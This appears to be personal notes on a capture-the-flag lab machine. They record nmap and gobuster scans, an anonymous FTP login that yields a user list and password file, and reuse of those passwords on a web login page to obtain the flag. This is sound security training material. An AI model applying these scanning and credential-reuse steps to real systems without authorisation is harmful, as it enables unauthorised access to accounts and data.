----
### Initial IPs

Attacker = 10.10.14.136
Victim = 10.129.35.6

----
### Initial Scan

- Ran the initial scan and found that ftp and webserver are running 
```shell
nmap -sV 10.129.35.6 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 15:36 EDT
Nmap scan report for 10.129.35.6
Host is up (0.018s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Unix

```
- Did a different type of scan to seen if we can get different info 
```shell
nmap -sC 10.129.35.6
Starting Nmap 7.93 ( https://nmap.org ) 
Nmap scan report for 10.129.35.6

21/tcp open  ftp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.136
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd

80/tcp open  http
|_http-title: Smash - Bootstrap Business Template

```

- based on the results we found that we can connect ftp server using  **Anonymous FTP login allowed** which could mean that there is no password attached  
- Tried this method and it was sucessful
```shell
ftp anonymous@10.129.35.6

Connected to 10.129.35.6.
220 (vsFTPd 3.0.3)
230 Login successful.

Remote system type is UNIX.

```
- Found list of user names and paswords and downloaded them to the Attacker machine
```shell

ftp>ls -ll
229 Entering Extended Passive Mode (|||46557|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd

ftp> get allowed.userlist
ftp> get allowed.userlist.passwd

62 bytes received in 00:00 (3.41 KiB/s)

```
- Given that there is a web server decided to visit the url  in the browser. Clicked on the links and navigated around the site to find inputs. Couldn't find any. Also checked the source code to see if anything is hidden there was nothing  ![[Pasted image 20230323200518.png]]

- Then decided to see if there was any hidden dirs using go buster . found that there is a login and logout page
```shell
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.35.6
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/03/23 16:07:07 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/assets               (Status: 301) [Size: 311] [--> http://10.129.35.6/assets/]                                                                          
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 308] [--> http://10.129.35.6/css/]
/dashboard            (Status: 301) [Size: 314] [--> http://10.129.35.6/dashboard/]                                                                       
/fonts                (Status: 301) [Size: 310] [--> http://10.129.35.6/fonts/]                                                                           
/index.html           (Status: 200) [Size: 58565]
/js                   (Status: 301) [Size: 307] [--> http://10.129.35.6/js/]
/login.php            (Status: 200) [Size: 1577]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/server-status        (Status: 403) [Size: 276]
Progress: 9228 / 9230 (99.98%)


```
![[Pasted image 20230323200909.png]]

- Tried to use some default passwords in then form then checked the password user list. Found the flag after testing each of the passwords in the password file
![[Pasted image 20230323201751.png]]
